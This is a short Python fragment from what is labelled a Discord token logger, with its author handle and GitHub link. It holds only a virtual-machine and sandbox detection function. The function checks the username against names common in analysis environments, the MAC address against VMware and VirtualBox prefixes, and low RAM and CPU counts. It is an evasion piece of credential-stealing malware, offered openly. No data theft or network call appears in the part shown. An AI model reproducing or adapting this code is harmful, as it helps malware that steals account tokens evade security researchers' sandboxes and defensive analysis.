# Token Logger - Deadconvicess
# Github - https://github.com/deadconvicess/Discord-Token-Logger


# Vm Check 
def Vm_1():
    import platform, os, uuid, psutil
    vm_users = ["WDAGUtilityAccount", "sandbox", "user", "test"" JOHN-PC", "Malware", "vm"]
    vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:1C:14", "00:50:56"]
    if any(user.lower() in os.getenv("USERNAME", "").lower() for user in vm_users):
        return True
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                   for ele in range(0,8*6,8)][::-1])
    if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
        return True

    if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
        return True
    if psutil.cpu_count(logical=False) < 2:
        return True
    return False   